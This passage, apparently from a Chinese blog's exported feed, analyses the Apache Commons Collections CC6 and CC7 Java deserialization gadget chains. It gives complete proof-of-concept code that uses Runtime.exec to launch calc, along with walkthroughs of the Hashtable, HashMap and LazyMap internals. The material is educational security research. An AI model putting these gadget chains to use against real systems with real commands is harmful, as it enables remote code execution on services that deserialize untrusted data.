objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605003843229-754416907.png" alt="image-20220605003842219"></p>
<p>前面的代码和cc1、cc5链一致，看下不同的地方。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashSet hashSet=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">hashSet.add(tiedMapEntry);</span><br><span class="line">lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"> <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br></pre></td></tr></table></figure>

<p>使用的是<code>HashSet</code>来进行构造，将前面的<code>TiedMapEntry</code>实例化对象添加进去，还调用了<code>lazyMap.remove</code>方法将<code>test1</code>给移除，这是为了能进入到判断语句里面去。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010414103-1179196187.png" alt="image-20220605010413225"></p>
<p>接下来进行调试分析，在<code>HashSet#readObject()</code>方法中打下断点</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010154554-133073869.png" alt="image-20220605010153640"></p>
<p>在<code>Hashset</code>的<code>readObject</code>方法中，回去调用<code>map</code>的<code>put</code>方法。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010849928-1051815863.png" alt="image-20220605010848871"></p>
<p>这里调用的是<code>Hashmap</code>的<code>put</code>方法，跟进一下该方法。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605010940153-1645120977.png" alt="image-20220605010939375"></p>
<p>方法中会调用<code>hash()</code>方法，跟进到<code>hash()</code>方法中，发现会调用<code>key.hashCode()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605011124493-1678946676.png" alt="image-20220605011123771"></p>
<p><code>hashcode</code>还会去调用<code>getValue()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605011333692-1054386596.png" alt="image-20220605011332786"></p>
<p>进入<code>getValue()</code>方法，后续的分析就和cc5一致了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220605011452059-612193209.png" alt="image-20220605011451491"></p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashSet.readObject-&gt;HashMap.put</span><br><span class="line">-&gt;HashMap.hash-&gt;TiedMapEntry.hashCode</span><br><span class="line">-&gt;TiedMapEntry.getValue-&gt;LazyMap.get</span><br><span class="line">-&gt;ChainedTransformer.transform-&gt;InvokerTransformer.transform</span><br><span class="line">-&gt;Runtime.exec</span><br></pre></td></tr></table></figure>

<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>poc2：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;cc6&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,transformers);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(expMap);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13892510.html">https://www.cnblogs.com/nice0e3/p/13892510.html</a></p>
<p><a href="https://blog.csdn.net/rfrder/article/details/119739082">https://blog.csdn.net/rfrder/article/details/119739082</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Commons Collections7分析</title>
    <url>/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections7%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>该链和CC6类似，不过CC7利用链中是使用<code>Hashtable</code>作为反序列化的入口点。</p>
<span id="more"></span>

<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject</span><br><span class="line">Hashtable.reconstitutionPut</span><br><span class="line">Hashtable.reconstitutionPut</span><br><span class="line">  LazyMap.equals 没实现，找父类</span><br><span class="line">     AbstractMapDecorator.equals</span><br><span class="line">        HashMap.equals 没实现，找父类</span><br><span class="line">           AbstractMap.equals</span><br><span class="line">              LazyMap.get</span><br><span class="line">   ChainedTransformer.transform()</span><br><span class="line">        ConstantTransformer.transform()</span><br><span class="line"> InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test1.out&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test1.out&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"><span class="comment">//            return hashtable;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先看下<code>Hashtable</code>序列化过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//临时变量（栈）</span></span><br><span class="line">      Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">          s.defaultWriteObject();</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//写入table的容量</span></span><br><span class="line">          s.writeInt(table.length);</span><br><span class="line">	<span class="comment">//写入table的元素个数</span></span><br><span class="line">          s.writeInt(count);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">//取出table中的元素，放入栈中（entryStack）</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">              Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"> </span><br><span class="line">              <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                  entryStack =</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                  entry = entry.next;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//依次写入栈中的每个元素</span></span><br><span class="line">      <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">          s.writeObject(entryStack.key);</span><br><span class="line">          s.writeObject(entryStack.value);</span><br><span class="line">          entryStack = entryStack.next;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>Hashtable有一个Entry<?,?>[]类型的table属性，用于存放元素（键值对）。Hashtable在序列化时会先把table数组的容量和table数组中的元素个数写入到序列化流中，然后将table数组中的元素取出写入到序列化流中。</p>
<p>再来看Hashtable的反序列化流程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">       s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 读取table数组的容量</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">	<span class="comment">//读取table数组的元素个数</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//计算table数组的length</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">       <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">           length--;</span><br><span class="line">       <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">           length = origlength;</span><br><span class="line">	<span class="comment">//根据length创建table数组</span></span><br><span class="line">       table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">       threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">       count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//反序列化，还原table数组</span></span><br><span class="line">       <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">           <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">               <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">           <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">               <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">           reconstitutionPut(table, key, value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>Hashtable会先从反序列化流中读取table数组的容量和元素个数，根据origlength 和elements 计算出table数组的length，根据length来创建table数组，然后从反序列化流中依次读取每个元素，再调用reconstitutionPut方法将元素重新放入table数组（Hashtable的table属性），最终完成反序列化。</p>
<p>我们分析一下reconstitutionPut方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="keyword">throws</span> StreamCorruptedException &#123;</span><br><span class="line">	<span class="comment">//value不能为null</span></span><br><span class="line">       <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//重新计算key的hash值</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">	<span class="comment">//根据hash值计算存储索引</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">	<span class="comment">//判断元素的key是否重复</span></span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">		<span class="comment">//如果key重复则抛出异常</span></span><br><span class="line">           <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//key不重复则将元素添加到table数组中</span></span><br><span class="line">       <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">           Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">       tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">       count++;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>reconstitutionPut方法首先对value进行不为null的校验，否则抛出反序列化异常，然后根据key计算出元素在table数组中的存储索引，判断元素在table数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成Entry并添加到table数组中。</p>
<p>CC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在判断重复元素的时候校验了两个元素的hash值是否一样，然后接着key会调用equals方法判断key是否重复时就会触发漏洞。</p>
<p>跟进<code>e.key.equals()</code>，发现调用的是LazyMap的equals方法，但是LazyMap中并没有equals方法，实际上是调用了LazyMap的父类AbstractMapDecorator的equals方法，虽然AbstractMapDecorator是一个抽象类，但它实现了equals方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">	<span class="comment">//是否为同一对象（比较引用）</span></span><br><span class="line">	<span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//调用HashMap的equals方法</span></span><br><span class="line">	<span class="keyword">return</span> map.equals(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们通过LazyMap的decorate()方法将HashMap传给了map属性，因此这里会调用HashMap的equals方法。而HashMap中不存在equals方法，但HashMap继承了AbstractMap抽象类，该类中有一个equals方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line"><span class="comment">//是否为同一对象</span></span><br><span class="line">      <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//运行类型是否不是Map</span></span><br><span class="line">      <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//向上转型</span></span><br><span class="line">      Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line"><span class="comment">//判断HashMap的元素的个数size</span></span><br><span class="line">      <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="comment">//获取HashMap的迭代器</span></span><br><span class="line">          Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">          <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">		<span class="comment">//获取每个元素（Node）</span></span><br><span class="line">              Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">		<span class="comment">//获取key和value</span></span><br><span class="line">              <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">              <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">		<span class="comment">//如果value为null，则判断key</span></span><br><span class="line">              <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//如果value不为null，判断value内容是否相同</span></span><br><span class="line">                  <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>其中m对象本质上是一个LazyMap，LazyMap的get方法内部会判断当前传入的key是否已存在，如果不在则会进入if语句中调用transform方法，从而产生漏洞。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">     <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">     <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="comment">//构造命令执行环境</span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">         map.put(key, value);</span><br><span class="line">         <span class="keyword">return</span> value;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> map.get(key);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

